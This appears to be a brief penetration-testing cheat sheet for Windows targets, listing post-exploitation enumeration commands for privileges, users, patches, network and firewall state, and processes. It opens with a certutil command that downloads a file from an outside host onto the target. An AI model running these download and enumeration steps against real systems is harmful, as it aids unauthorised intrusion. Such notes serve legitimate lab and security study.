#windows 


Download a file
```powershell
certutil -urlcache -f http://10.10.10.1/<file> <binary_name>
```

### System information
`whoami /priv`
`net users`
`net localgroup administrators`
`systeminfo`

```powershell 
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

This information is very useful as it provides us with an idea of what specific version of Windows is running on the target and the updates that have been installed on the target system.

#### Network Information
`route print`
`arp -a` devices on network
`netstat -ano` tcp connections
`netsh firewall show state`
`netsh advfirewall firewall`
`netsh advfirewall show allprofiles`

### Process
`tasklist /SVC`
